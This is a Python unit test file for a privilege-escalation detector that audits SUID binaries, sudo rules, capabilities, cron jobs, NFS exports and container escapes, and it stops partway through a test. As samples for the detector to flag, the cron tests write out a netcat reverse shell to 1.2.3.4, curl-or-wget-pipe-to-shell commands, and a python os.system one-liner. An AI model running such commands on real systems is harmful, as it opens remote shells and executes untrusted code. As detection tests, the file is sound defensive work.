#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import unittest
import os
import tempfile
import sqlite3
import json
import time
import stat
from unittest.mock import patch, MagicMock, mock_open
import sys
import concurrent.futures

# Add src directory to path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../src')))
from modules.privilege_escalation import PrivilegeEscalationDetector

# Create a patched version of ThreadPoolExecutor that works synchronously
class SynchronousExecutor:
    def __init__(self, max_workers=None):
        self.max_workers = max_workers

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        pass

    def submit(self, fn, *args, **kwargs):
        class FakeFuture:
            def __init__(self, result):
                self._result = result

            def result(self):
                return self._result

        # Execute the function synchronously
        result = fn(*args, **kwargs)
        return FakeFuture(result)

class TestPrivilegeEscalation(unittest.TestCase):
    """Test cases for privilege_escalation module"""
    
    def setUp(self):
        """Set up test environment"""
        # Create a temporary database file
        self.temp_db = tempfile.NamedTemporaryFile(delete=False)
        self.temp_db.close()
        
        # Create a temporary config file
        self.temp_config = tempfile.NamedTemporaryFile(delete=False)
        test_config = {
            "scan_directories": ["/bin", "/usr/bin"],
            "excluded_paths": ["/tmp", "/var/tmp"],
            "thread_count": 1,
            "scan_interval": 60
        }
        self.temp_config.write(json.dumps(test_config).encode())
        self.temp_config.close()
        
        # Initialize the PrivilegeEscalationDetector with test parameters
        self.detector = PrivilegeEscalationDetector(database_path=self.temp_db.name, config_file=self.temp_config.name)
        
        # Patch ThreadPoolExecutor to use our synchronous executor for all tests
        self.thread_pool_patcher = patch('concurrent.futures.ThreadPoolExecutor', SynchronousExecutor)
        self.thread_pool_patcher.start()
    
    def tearDown(self):
        """Clean up test environment"""
        # Stop patchers
        self.thread_pool_patcher.stop()
        
        # Remove temporary files
        os.unlink(self.temp_db.name)
        os.unlink(self.temp_config.name)
    
    def test_initialization(self):
        """Test PrivilegeEscalationDetector initialization"""
        self.assertEqual(self.detector.database_path, self.temp_db.name)
        self.assertEqual(self.detector.config["scan_directories"], ["/bin", "/usr/bin"])
        self.assertEqual(self.detector.config["excluded_paths"], ["/tmp", "/var/tmp"])
        self.assertEqual(self.detector.config["thread_count"], 1)
        self.assertEqual(self.detector.config["scan_interval"], 60)
    
    def test_is_excluded_path(self):
        """Test _is_excluded_path method"""
        # Test excluded paths
        self.assertTrue(self.detector._is_excluded_path("/tmp"))
        self.assertTrue(self.detector._is_excluded_path("/tmp/file.txt"))
        self.assertTrue(self.detector._is_excluded_path("/var/tmp"))
        self.assertTrue(self.detector._is_excluded_path("/var/tmp/file.txt"))
        
        # Test non-excluded paths
        self.assertFalse(self.detector._is_excluded_path("/bin"))
        self.assertFalse(self.detector._is_excluded_path("/usr/bin"))
        self.assertFalse(self.detector._is_excluded_path("/home/user"))
    
    @patch('subprocess.run')
    @patch('os.stat')
    @patch('os.path.exists')
    def test_check_suid_suspicious(self, mock_exists, mock_stat, mock_run):
        """Test _check_suid_suspicious method"""
        # Setup mocks
        mock_exists.return_value = True
        stat_result = MagicMock()
        stat_result.st_mode = 0o755  # Not world-writable
        stat_result.st_mtime = time.time() - 365 * 24 * 60 * 60  # Old file (1 year ago)
        mock_stat.return_value = stat_result
        
        process_mock = MagicMock()
        process_mock.stdout = "ELF binary"
        mock_run.return_value = process_mock
        
        # Test excluded binary
        self.detector.config["excluded_suid_binaries"] = ["/bin/su"]
        is_suspicious, reason = self.detector._check_suid_suspicious("/bin/su")
        self.assertFalse(is_suspicious)
        self.assertEqual(reason, "")
        
        # Test script with shebang
        with patch('builtins.open', mock_open(read_data=b'#!/bin/sh\necho "Hello"')):
            is_suspicious, reason = self.detector._check_suid_suspicious("/usr/bin/custom_script")
            self.assertTrue(is_suspicious)
            self.assertEqual(reason, "SUID script found - extremely dangerous")
        
        # Test world-writable binary
        stat_result.st_mode = 0o777  # World-writable
        is_suspicious, reason = self.detector._check_suid_suspicious("/usr/bin/custom_binary")
        self.assertTrue(is_suspicious)
        self.assertEqual(reason, "SUID binary is writable by group or others")
        
        # Test unusual location
        stat_result.st_mode = 0o755  # Reset permissions
        is_suspicious, reason = self.detector._check_suid_suspicious("/tmp/custom_binary")
        self.assertTrue(is_suspicious)
        self.assertTrue("unusual location" in reason.lower())
        
        # Test recently modified file
        stat_result.st_mtime = time.time() - 24 * 60 * 60  # 1 day ago
        is_suspicious, reason = self.detector._check_suid_suspicious("/usr/bin/custom_binary")
        self.assertTrue(is_suspicious)
        self.assertEqual(reason, "Recently modified SUID binary")
        
        # Test shell script
        process_mock.stdout = "shell script"
        is_suspicious, reason = self.detector._check_suid_suspicious("/usr/bin/custom_binary")
        self.assertTrue(is_suspicious)
        self.assertEqual(reason, "SUID shell script")
        
        # Test suspicious strings
        process_mock.stdout = "ELF binary"
        strings_mock = MagicMock()
        strings_mock.stdout = "normal function\nsystem('/bin/sh')\nnormal function"
        mock_run.side_effect = [process_mock, strings_mock]
        
        is_suspicious, reason = self.detector._check_suid_suspicious("/usr/bin/custom_binary")
        self.assertTrue(is_suspicious)
        self.assertTrue("suspicious string" in reason.lower())
    
    @patch('subprocess.run')
    @patch('os.path.exists')
    def test_find_suid_sgid_binaries(self, mock_exists, mock_run):
        """Test find_suid_sgid_binaries method"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Mock the find command output
        find_process = MagicMock()
        find_process.returncode = 0
        find_process.stdout = "/bin/su\n/usr/bin/sudo\n/usr/bin/custom_binary\n"
        mock_run.return_value = find_process
        
        # Mock the stat for each file
        with patch('os.stat') as mock_stat:
            # Create stat results for each file
            stat_results = {}
            for file_path in ["/bin/su", "/usr/bin/sudo", "/usr/bin/custom_binary"]:
                stat_result = MagicMock()
                stat_result.st_mode = 0o4755  # SUID
                stat_result.st_uid = 0  # root
                stat_result.st_gid = 0  # root
                stat_result.st_size = 1024
                stat_result.st_mtime = time.time() - 365 * 24 * 60 * 60  # 1 year ago
                stat_results[file_path] = stat_result
            
            # Set side effect to return appropriate stat result for each file
            mock_stat.side_effect = lambda path: stat_results.get(path, MagicMock())
            
            # Mock the pwd and grp lookups
            with patch('pwd.getpwuid') as mock_pwd, patch('grp.getgrgid') as mock_grp:
                pwd_result = MagicMock()
                pwd_result.pw_name = "root"
                mock_pwd.return_value = pwd_result
                
                grp_result = MagicMock()
                grp_result.gr_name = "root"
                mock_grp.return_value = grp_result
                
                # Mock the _check_suid_suspicious method
                with patch.object(self.detector, '_check_suid_suspicious') as mock_check:
                    # Set up return values for _check_suid_suspicious
                    mock_check.side_effect = [
                        (False, ""),  # /bin/su is not suspicious
                        (False, ""),  # /usr/bin/sudo is not suspicious
                        (True, "Recently modified binary")  # /usr/bin/custom_binary is suspicious
                    ]
                    
                    # Call the method
                    suid_binaries = self.detector.find_suid_sgid_binaries()
                    
                    # Validate
                    self.assertEqual(len(suid_binaries), 3)
                    
                    # Check the details of each binary
                    self.assertEqual(suid_binaries[0]["path"], "/bin/su")
                    self.assertEqual(suid_binaries[0]["owner"], "root")
                    self.assertEqual(suid_binaries[0]["group_owner"], "root")
                    self.assertEqual(suid_binaries[0]["is_suspicious"], False)
                    
                    self.assertEqual(suid_binaries[2]["path"], "/usr/bin/custom_binary")
                    self.assertEqual(suid_binaries[2]["is_suspicious"], True)
                    self.assertEqual(suid_binaries[2]["suspicious_reason"], "Recently modified binary")
    
    @patch('subprocess.run')
    @patch('os.path.exists')
    @patch('builtins.open', new_callable=mock_open, read_data="testuser ALL=(ALL) NOPASSWD: ALL")
    def test_check_sudo_config(self, mock_file, mock_exists, mock_run):
        """Test check_sudo_config method"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Mock sudo -l command output
        sudo_process = MagicMock()
        sudo_process.returncode = 0
        sudo_process.stdout = """
User testuser may run the following commands on this host:
    (ALL) NOPASSWD: ALL
User otheruser may run the following commands on this host:
    (ALL) /usr/bin/vim
"""
        mock_run.return_value = sudo_process
        
        # Call the method
        sudo_configs = self.detector.check_sudo_config()
        
        # Validate
        self.assertGreaterEqual(len(sudo_configs), 2)
        
        # Check for the testuser config
        testuser_config = next((config for config in sudo_configs if config["user"] == "testuser"), None)
        self.assertIsNotNone(testuser_config)
        self.assertEqual(testuser_config["privileges"], "NOPASSWD: ALL")
        self.assertTrue(testuser_config["is_dangerous"])
        
        # Check for the otheruser config
        otheruser_config = next((config for config in sudo_configs if config["user"] == "otheruser"), None)
        self.assertIsNotNone(otheruser_config)
        self.assertEqual(otheruser_config["privileges"], "/usr/bin/vim")
        self.assertTrue(otheruser_config["is_dangerous"])
    
    def test_check_sudo_config_dangerous(self):
        """Test _check_sudo_config_dangerous method"""
        # Test known dangerous configs
        self.assertTrue(self.detector._check_sudo_config_dangerous("NOPASSWD: ALL"))
        self.assertTrue(self.detector._check_sudo_config_dangerous("NOPASSWD: /bin/bash"))
        self.assertTrue(self.detector._check_sudo_config_dangerous("PASSWD: /usr/bin/vim"))
        
        # Test ALL privileges
        self.assertTrue(self.detector._check_sudo_config_dangerous("(ALL)"))
        self.assertTrue(self.detector._check_sudo_config_dangerous("(ALL : ALL)"))
        
        # Test dangerous commands
        self.assertTrue(self.detector._check_sudo_config_dangerous("/usr/bin/python"))
        self.assertTrue(self.detector._check_sudo_config_dangerous("/bin/cp"))
        self.assertTrue(self.detector._check_sudo_config_dangerous("/usr/bin/find"))
        
        # Test safe configs
        self.assertFalse(self.detector._check_sudo_config_dangerous("/usr/bin/safe_command"))
        self.assertFalse(self.detector._check_sudo_config_dangerous("/usr/local/bin/custom_safe_script"))
    
    @patch('subprocess.run')
    @patch('os.path.exists')
    def test_check_capabilities(self, mock_exists, mock_run):
        """Test check_capabilities method"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Mock getcap command output
        getcap_process = MagicMock()
        getcap_process.returncode = 0
        getcap_process.stdout = """
/usr/bin/ping = cap_net_raw+ep
/usr/bin/custombin = cap_sys_admin+ep
/usr/bin/safebin = cap_net_bind_service+ep
"""
        mock_run.return_value = getcap_process
        
        # Call the method
        capabilities = self.detector.check_capabilities()
        
        # Validate
        self.assertEqual(len(capabilities), 3)
        
        # Check specific capabilities
        ping_cap = next((cap for cap in capabilities if cap["path"] == "/usr/bin/ping"), None)
        self.assertIsNotNone(ping_cap)
        self.assertEqual(ping_cap["capabilities"], "cap_net_raw+ep")
        self.assertTrue(ping_cap["is_dangerous"])
        
        custombin_cap = next((cap for cap in capabilities if cap["path"] == "/usr/bin/custombin"), None)
        self.assertIsNotNone(custombin_cap)
        self.assertEqual(custombin_cap["capabilities"], "cap_sys_admin+ep")
        self.assertTrue(custombin_cap["is_dangerous"])
        
        safebin_cap = next((cap for cap in capabilities if cap["path"] == "/usr/bin/safebin"), None)
        self.assertIsNotNone(safebin_cap)
        self.assertEqual(safebin_cap["capabilities"], "cap_net_bind_service+ep")
        self.assertFalse(safebin_cap["is_dangerous"])
    
    def test_check_capabilities_dangerous(self):
        """Test _check_capabilities_dangerous method"""
        # Test dangerous capabilities
        self.assertTrue(self.detector._check_capabilities_dangerous("cap_sys_admin+ep"))
        self.assertTrue(self.detector._check_capabilities_dangerous("cap_sys_ptrace+ep"))
        self.assertTrue(self.detector._check_capabilities_dangerous("cap_setuid+ep"))
        self.assertTrue(self.detector._check_capabilities_dangerous("cap_sys_module,cap_net_admin+ep"))
        
        # Test full capability set with =ep
        self.assertTrue(self.detector._check_capabilities_dangerous("=ep"))
        
        # Test safe capabilities
        self.assertFalse(self.detector._check_capabilities_dangerous("cap_net_bind_service+ep"))
        self.assertFalse(self.detector._check_capabilities_dangerous("cap_chown+p"))
    
    @patch('os.path.exists')
    @patch('os.path.isdir')
    @patch('os.listdir')
    @patch('builtins.open', new_callable=mock_open)
    def test_check_cron_jobs(self, mock_file, mock_listdir, mock_isdir, mock_exists):
        """Test check_cron_jobs method"""
        # Setup mocks
        mock_exists.return_value = True
        mock_isdir.return_value = True
        mock_listdir.return_value = ["job1", "job2"]
        
        # Mock file contents for different files
        read_data = {
            "/etc/crontab": "* * * * * root /bin/echo test\n0 0 * * * root curl http://example.com | bash\n",
            "/etc/cron.d/job1": "* * * * * user /usr/bin/python -c 'import os; os.system(\"id\");'\n",
            "/etc/cron.d/job2": "* * * * * root /usr/bin/safe_command\n"
        }
        
        def mock_file_contents(filename, *args, **kwargs):
            handler = mock_open(read_data=read_data.get(filename, "")).return_value
            return handler
        
        mock_file.side_effect = mock_file_contents
        
        # Mock the _check_cron_suspicious method
        with patch.object(self.detector, '_check_cron_suspicious') as mock_check:
            # Set up return values for _check_cron_suspicious
            mock_check.side_effect = [
                (False, ""),  # /bin/echo test is not suspicious
                (True, "Downloads and executes scripts from the internet"),  # curl | bash is suspicious
                (True, "Uses potential code execution"),  # python -c is suspicious
                (False, "")  # safe_command is not suspicious
            ]
            
            # Call the method
            cron_jobs = self.detector.check_cron_jobs()
            
            # Validate
            self.assertEqual(len(cron_jobs), 4)
            
            # Check specific jobs
            echo_job = next((job for job in cron_jobs if "echo test" in job["command"]), None)
            self.assertIsNotNone(echo_job)
            self.assertEqual(echo_job["user"], "root")
            self.assertFalse(echo_job["is_suspicious"])
            
            curl_job = next((job for job in cron_jobs if "curl" in job["command"]), None)
            self.assertIsNotNone(curl_job)
            self.assertEqual(curl_job["user"], "root")
            self.assertTrue(curl_job["is_suspicious"])
            self.assertEqual(curl_job["suspicious_reason"], "Downloads and executes scripts from the internet")
            
            python_job = next((job for job in cron_jobs if "python" in job["command"]), None)
            self.assertIsNotNone(python_job)
            self.assertEqual(python_job["user"], "user")
            self.assertTrue(python_job["is_suspicious"])
            self.assertEqual(python_job["suspicious_reason"], "Uses potential code execution")
    
    def test_check_cron_suspicious(self):
        """Test _check_cron_suspicious method"""
        # Test suspicious patterns
        is_suspicious, reason = self.detector._check_cron_suspicious("curl http://example.com | bash")
        self.assertTrue(is_suspicious)
        self.assertTrue("downloads and executes" in reason.lower())
        
        is_suspicious, reason = self.detector._check_cron_suspicious("wget -q -O - http://example.com/script.sh | sh")
        self.assertTrue(is_suspicious)
        self.assertTrue("downloads and executes" in reason.lower())
        
        is_suspicious, reason = self.detector._check_cron_suspicious("python -c 'import os; os.system(\"id\")'")
        self.assertTrue(is_suspicious)
        self.assertTrue("suspicious pattern" in reason.lower())
        
        is_suspicious, reason = self.detector._check_cron_suspicious("echo `base64 -d <<< SGVsbG8=`")
        self.assertTrue(is_suspicious)
        self.assertTrue("base64" in reason.lower())
        
        is_suspicious, reason = self.detector._check_cron_suspicious("nc -e /bin/bash 1.2.3.4 4444")
        self.assertTrue(is_suspicious)
        self.assertTrue("network connection" in reason.lower())
        
        # Test safe commands
        is_suspicious, reason = self.detector._check_cron_suspicious("/usr/bin/find /tmp -type f -mtime +7 -delete")
        self.assertFalse(is_suspicious)
        
        is_suspicious, reason = self.detector._check_cron_suspicious("/bin/echo 'Backup completed'")
        self.assertFalse(is_suspicious)
        
        is_suspicious, reason = self.detector._check_cron_suspicious("/usr/bin/rsync -a /src /dst")
        self.assertFalse(is_suspicious)
    
    @patch('os.path.exists')
    @patch('os.path.isfile')
    @patch('builtins.open', new_callable=mock_open, read_data="/data *(rw,no_root_squash)\n/home *(rw)\n")
    def test_check_nfs_exports(self, mock_file, mock_isfile, mock_exists):
        """Test check_nfs_exports method"""
        # Setup mocks
        mock_exists.return_value = True
        mock_isfile.return_value = True
        
        # Call the method
        nfs_exports = self.detector.check_nfs_exports()
        
        # Validate
        self.assertEqual(len(nfs_exports), 2)
        
        # Check specific exports
        data_export = next((ex for ex in nfs_exports if ex["path"] == "/data"), None)
        self.assertIsNotNone(data_export)
        self.assertEqual(data_export["options"], "*(rw,no_root_squash)")
        self.assertTrue(data_export["is_dangerous"])
        
        home_export = next((ex for ex in nfs_exports if ex["path"] == "/home"), None)
        self.assertIsNotNone(home_export)
        self.assertEqual(home_export["options"], "*(rw)")
        self.assertFalse(home_export["is_dangerous"])
    
    def test_check_nfs_dangerous(self):
        """Test _check_nfs_dangerous method"""
        # Test dangerous options
        self.assertTrue(self.detector._check_nfs_dangerous("*(rw,no_root_squash)"))
        self.assertTrue(self.detector._check_nfs_dangerous("192.168.1.0/24(rw,no_all_squash)"))
        self.assertTrue(self.detector._check_nfs_dangerous("*(rw,insecure,no_root_squash)"))
        
        # Test safe options
        self.assertFalse(self.detector._check_nfs_dangerous("*(ro)"))
        self.assertFalse(self.detector._check_nfs_dangerous("*(rw)"))
        self.assertFalse(self.detector._check_nfs_dangerous("192.168.1.0/24(rw,all_squash)"))
    
    @patch('os.path.exists')
    @patch('os.path.isfile')
    @patch('os.path.isdir')
    @patch('os.walk')
    @patch('os.stat')
    def test_check_writable_configs(self, mock_stat, mock_walk, mock_isdir, mock_isfile, mock_exists):
        """Test check_writable_configs method"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Set up different paths to test different branches
        mock_isfile.side_effect = lambda path: path in ["/etc/passwd", "/etc/shadow"]
        mock_isdir.side_effect = lambda path: path in ["/etc/cron.d"]
        
        # Set up walk results for directory
        mock_walk.return_value = [
            ("/etc/cron.d", [], ["job1", "job2"])
        ]
        
        # Set up stat results with different permissions
        def mock_stat_results(path):
            stat_result = MagicMock()
            
            if path == "/etc/passwd":
                # World-writable passwd file (very dangerous)
                stat_result.st_mode = 0o666
                stat_result.st_uid = 0
                stat_result.st_gid = 0
            elif path == "/etc/shadow":
                # Properly secured shadow file
                stat_result.st_mode = 0o640
                stat_result.st_uid = 0
                stat_result.st_gid = 0
            elif path == "/etc/cron.d/job1":
                # Group-writable cron job (dangerous)
                stat_result.st_mode = 0o664
                stat_result.st_uid = 0
                stat_result.st_gid = 0
            elif path == "/etc/cron.d/job2":
                # Properly secured cron job
                stat_result.st_mode = 0o644
                stat_result.st_uid = 0
                stat_result.st_gid = 0
            
            return stat_result
        
        mock_stat.side_effect = mock_stat_results
        
        # Mock pwd and grp lookups
        with patch('pwd.getpwuid') as mock_pwd, patch('grp.getgrgid') as mock_grp:
            pwd_result = MagicMock()
            pwd_result.pw_name = "root"
            mock_pwd.return_value = pwd_result
            
            grp_result = MagicMock()
            grp_result.gr_name = "root"
            mock_grp.return_value = grp_result
            
            # Call the method
            writable_configs = self.detector.check_writable_configs()
            
            # Validate
            self.assertEqual(len(writable_configs), 2)
            
            # Only /etc/passwd and /etc/cron.d/job1 should be detected as writable
            paths = [config["path"] for config in writable_configs]
            self.assertIn("/etc/passwd", paths)
            self.assertIn("/etc/cron.d/job1", paths)
            
            # Check details of passwd file
            passwd_config = next((config for config in writable_configs if config["path"] == "/etc/passwd"), None)
            self.assertIsNotNone(passwd_config)
            self.assertEqual(passwd_config["owner"], "root")
            self.assertEqual(passwd_config["group_owner"], "root")
            self.assertEqual(passwd_config["permissions"] & (stat.S_IWGRP | stat.S_IWOTH), stat.S_IWGRP | stat.S_IWOTH)
    
    @patch('os.path.exists')
    @patch('builtins.open', new_callable=mock_open, read_data="docker")
    @patch('subprocess.run')
    def test_check_container_escapes(self, mock_run, mock_file, mock_exists):
        """Test check_container_escapes method"""
        # Setup mocks to simulate being in a container
        mock_exists.side_effect = lambda path: path == "/.dockerenv" or path == "/proc/1/cgroup"
        
        # Mock subprocess calls for capability checks
        process_mock = MagicMock()
        process_mock.returncode = 0
        process_mock.stdout = "uid=0(root)"
        mock_run.return_value = process_mock
        
        # Call the method
        escape_vectors = self.detector.check_container_escapes()
        
        # Validate
        self.assertGreaterEqual(len(escape_vectors), 1)
        
        # Check for container detection
        container_detection = next((v for v in escape_vectors if v["vector_type"] == "container_detection"), None)
        self.assertIsNotNone(container_detection)
        self.assertIn("docker", container_detection["details"])
        
        # Set up mocks to simulate a privileged container
        with patch('builtins.open', mock_open(read_data="CapEff:\tffffff")) as m:
            escape_vectors = self.detector.check_container_escapes()
            
            # Check for privileged container detection
            privileged = next((v for v in escape_vectors if v["vector_type"] == "privileged_container"), None)
            self.assertIsNotNone(privileged)
            self.assertIn("privileged mode", privileged["details"].lower())
    
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.find_suid_sgid_binaries')
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.check_sudo_config')
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.check_capabilities')
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.check_cron_jobs')
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.check_nfs_exports')
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.check_writable_configs')
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.check_container_escapes')
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector._process_library_for_baseline')
    def test_create_baseline(self, mock_process, mock_container, mock_configs, 
                           mock_nfs, mock_cron, mock_capabilities, mock_sudo, mock_suid):
        """Test create_baseline method"""
        # Setup mocks
        mock_suid.return_value = [
            {
                "path": "/bin/su",
                "permissions": 0o4755,
                "owner": "root",
                "group_owner": "root",
                "size": 1024,
                "last_modified": 1234567890.0,
                "is_excluded": True,
                "is_suspicious": False,
                "suspicious_reason": ""
            },
            {
                "path": "/usr/bin/custom_binary",
                "permissions": 0o4755,
                "owner": "root",
                "group_owner": "root",
                "size": 2048,
                "last_modified": 1234567890.0,
                "is_excluded": False,
                "is_suspicious": True,
                "suspicious_reason": "Recently modified"
            }
        ]
        
        mock_sudo.return_value = [
            {
                "user": "testuser",
                "host": "ALL",
                "privileges": "NOPASSWD: ALL",
                "is_dangerous": True
            }
        ]
        
        mock_capabilities.return_value = [
            {
                "path": "/usr/bin/ping",
                "capabilities": "cap_net_raw+ep",
                "is_dangerous": True
            }
        ]
        
        mock_cron.return_value = [
            {
                "path": "/etc/crontab",
                "user": "root",
                "command": "curl http://example.com | bash",
                "schedule": "0 0 * * *",
                "is_suspicious": True,
                "suspicious_reason": "Downloads and executes scripts"
            }
        ]
        
        mock_nfs.return_value = [
            {
                "path": "/data",
                "options": "*(rw,no_root_squash)",
                "is_dangerous": True
            }
        ]
        
        mock_configs.return_value = [
            {
                "path": "/etc/passwd",
                "permissions": 0o666,
                "owner": "root",
                "group_owner": "root"
            }
        ]
        
        mock_container.return_value = [
            {
                "vector_type": "container_detection",
                "details": "Running inside Docker container"
            },
            {
                "vector_type": "privileged_container",
                "details": "Container running in privileged mode"
            }
        ]
        
        # Call the method
        stats = self.detector.create_baseline()
        
        # Validate
        self.assertEqual(stats["suid_binaries"], 2)
        self.assertEqual(stats["sudo_configs"], 1)
        self.assertEqual(stats["capabilities"], 1)
        self.assertEqual(stats["cron_jobs"], 1)
        self.assertEqual(stats["nfs_exports"], 1)
        self.assertEqual(stats["writable_configs"], 1)
        self.assertEqual(stats["container_escapes"], 2)
        self.assertEqual(stats["suspicious_items"], 7)  # All suspicious and dangerous items count
        
        # Check database
        conn = sqlite3.connect(self.detector.database_path)
        cursor = conn.cursor()
        
        # Check if SUID binaries were stored
        cursor.execute("SELECT COUNT(*) FROM suid_binaries")
        self.assertEqual(cursor.fetchone()[0], 2)
        
        # Check if sudo configs were stored
        cursor.execute("SELECT COUNT(*) FROM sudo_config")
        self.assertEqual(cursor.fetchone()[0], 1)
        
        # Check if capabilities were stored
        cursor.execute("SELECT COUNT(*) FROM capabilities")
        self.assertEqual(cursor.fetchone()[0], 1)
        
        # Check if cron jobs were stored
        cursor.execute("SELECT COUNT(*) FROM cron_jobs")
        self.assertEqual(cursor.fetchone()[0], 1)
        
        # Check if NFS exports were stored
        cursor.execute("SELECT COUNT(*) FROM nfs_exports")
        self.assertEqual(cursor.fetchone()[0], 1)
        
        # Check if writable configs were stored
        cursor.execute("SELECT COUNT(*) FROM writable_configs")
        self.assertEqual(cursor.fetchone()[0], 1)
        
        # Check if container escapes were stored
        cursor.execute("SELECT COUNT(*) FROM container_escapes")
        self.assertEqual(cursor.fetchone()[0], 2)
        
        conn.close()
    
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.find_suid_sgid_binaries')
    def test_check_integrity(self, mock_suid):
        """Test check_integrity method"""
        # Setup mocks
        # Return a modified set of SUID binaries to simulate changes
        mock_suid.return_value = [
            {
                # This binary is already in the database but with changed permissions
                "path": "/bin/su",
                "permissions": 0o6755,  # Changed from 0o4755
                "owner": "root",
                "group_owner": "root",
                "size": 1024,
                "last_modified": 1234567890.0,
                "is_excluded": True,
                "is_suspicious": False,
                "suspicious_reason": ""
            },
            {
                # This is a new binary not in the database
                "path": "/usr/bin/new_binary",
                "permissions": 0o4755,
                "owner": "root",
                "group_owner": "root",
                "size": 2048,
                "last_modified": 1234567890.0,
                "is_excluded": False,
                "is_suspicious": True,
                "suspicious_reason": "Recently added"
            }
        ]
        
        # Create test database with some SUID binaries
        conn = sqlite3.connect(self.detector.database_path)
        cursor = conn.cursor()
        
        # Add existing SUID binary
        cursor.execute('''
        INSERT INTO suid_binaries 
        (path, permissions, owner, group_owner, size, last_modified, 
         first_seen, last_checked, is_excluded, is_suspicious, suspicious_reason) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            "/bin/su",
            0o4755,  # Original permissions
            "root",
            "root",
            1024,
            1234567890.0,
            time.time(),
            time.time(),
            1,
            0,
            ""
        ))
        
        # Add a binary that will be "removed"
        cursor.execute('''
        INSERT INTO suid_binaries 
        (path, permissions, owner, group_owner, size, last_modified, 
         first_seen, last_checked, is_excluded, is_suspicious, suspicious_reason) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            "/usr/bin/removed_binary",
            0o4755,
            "root",
            "root",
            1024,
            1234567890.0,
            time.time(),
            time.time(),
            0,
            0,
            ""
        ))
        
        conn.commit()
        conn.close()
        
        # Call the method
        changes = self.detector.check_integrity()
        
        # Validate
        self.assertEqual(len(changes), 3)
        
        # Check types of changes
        change_types = [change["change_type"] for change in changes]
        self.assertIn("modified", change_types)  # /bin/su was modified
        self.assertIn("added", change_types)     # /usr/bin/new_binary was added
        self.assertIn("removed", change_types)   # /usr/bin/removed_binary was removed
        
        # Check details of changes
        for change in changes:
            if change["change_type"] == "modified":
                self.assertEqual(change["path"], "/bin/su")
                self.assertIn("permissions", change["details"])
            elif change["change_type"] == "added":
                self.assertEqual(change["path"], "/usr/bin/new_binary")
                self.assertTrue(change["is_suspicious"])
            elif change["change_type"] == "removed":
                self.assertEqual(change["path"], "/usr/bin/removed_binary")
        
        # Verify database was updated
        conn = sqlite3.connect(self.detector.database_path)
        cursor = conn.cursor()
        
        # Check if new binary was added
        cursor.execute("SELECT path FROM suid_binaries WHERE path = ?", ("/usr/bin/new_binary",))
        self.assertIsNotNone(cursor.fetchone())
        
        # Check if modified binary was updated
        cursor.execute("SELECT permissions FROM suid_binaries WHERE path = ?", ("/bin/su",))
        self.assertEqual(cursor.fetchone()[0], 0o6755)
        
        # Check if removed binary was deleted
        cursor.execute("SELECT path FROM suid_binaries WHERE path = ?", ("/usr/bin/removed_binary",))
        self.assertIsNone(cursor.fetchone())
        
        # Check if changes were recorded
        cursor.execute("SELECT COUNT(*) FROM escalation_changes")
        self.assertEqual(cursor.fetchone()[0], 3)
        
        conn.close()
    
    @patch('sqlite3.connect')
    def test_get_suspicious_vectors(self, mock_connect):
        """Test get_suspicious_vectors method"""
        # Setup mock connection and cursor
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_connect.return_value = mock_conn
        mock_conn.cursor.return_value = mock_cursor
        
        # Set up mock data for each query
        mock_cursor.fetchall.side_effect = [
            # suid_binaries
            [("/usr/bin/custom_binary", 0o4755, "root", "root", "Recently modified")],
            # sudo_configs
            [("testuser", "ALL", "NOPASSWD: ALL")],
            # capabilities
            [("/usr/bin/ping", "cap_net_raw+ep")],
            # cron_jobs
            [("/etc/crontab", "root", "curl http://example.com | bash", "0 0 * * *", "Downloads scripts")],
            # nfs_exports
            [("/data", "*(rw,no_root_squash)")],
            # writable_configs
            [("/etc/passwd", 0o666, "root", "root")],
            # container_escapes
            [("privileged_container", "Container running in privileged mode")]
        ]
        
        # Call the method
        suspicious = self.detector.get_suspicious_vectors()
        
        # Validate
        self.assertEqual(len(suspicious["suid_binaries"]), 1)
        self.assertEqual(suspicious["suid_binaries"][0]["path"], "/usr/bin/custom_binary")
        self.assertEqual(suspicious["suid_binaries"][0]["reason"], "Recently modified")
        
        self.assertEqual(len(suspicious["sudo_configs"]), 1)
        self.assertEqual(suspicious["sudo_configs"][0]["user"], "testuser")
        self.assertEqual(suspicious["sudo_configs"][0]["privileges"], "NOPASSWD: ALL")
        
        self.assertEqual(len(suspicious["capabilities"]), 1)
        self.assertEqual(suspicious["capabilities"][0]["path"], "/usr/bin/ping")
        self.assertEqual(suspicious["capabilities"][0]["capabilities"], "cap_net_raw+ep")
        
        self.assertEqual(len(suspicious["cron_jobs"]), 1)
        self.assertEqual(suspicious["cron_jobs"][0]["command"], "curl http://example.com | bash")
        self.assertEqual(suspicious["cron_jobs"][0]["reason"], "Downloads scripts")
        
        self.assertEqual(len(suspicious["nfs_exports"]), 1)
        self.assertEqual(suspicious["nfs_exports"][0]["path"], "/data")
        self.assertEqual(suspicious["nfs_exports"][0]["options"], "*(rw,no_root_squash)")
        
        self.assertEqual(len(suspicious["writable_configs"]), 1)
        self.assertEqual(suspicious["writable_configs"][0]["path"], "/etc/passwd")
        self.assertEqual(suspicious["writable_configs"][0]["permissions"], "0o666")
        
        self.assertEqual(len(suspicious["container_escapes"]), 1)
        self.assertEqual(suspicious["container_escapes"][0]["vector_type"], "privileged_container")
        self.assertEqual(suspicious["container_escapes"][0]["details"], "Container running in privileged mode")
    
    @patch('sqlite3.connect')
    def test_get_recent_changes(self, mock_connect):
        """Test get_recent_changes method"""
        # Setup mock connection and cursor
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_connect.return_value = mock_conn
        mock_conn.cursor.return_value = mock_cursor
        
        # Set up mock data
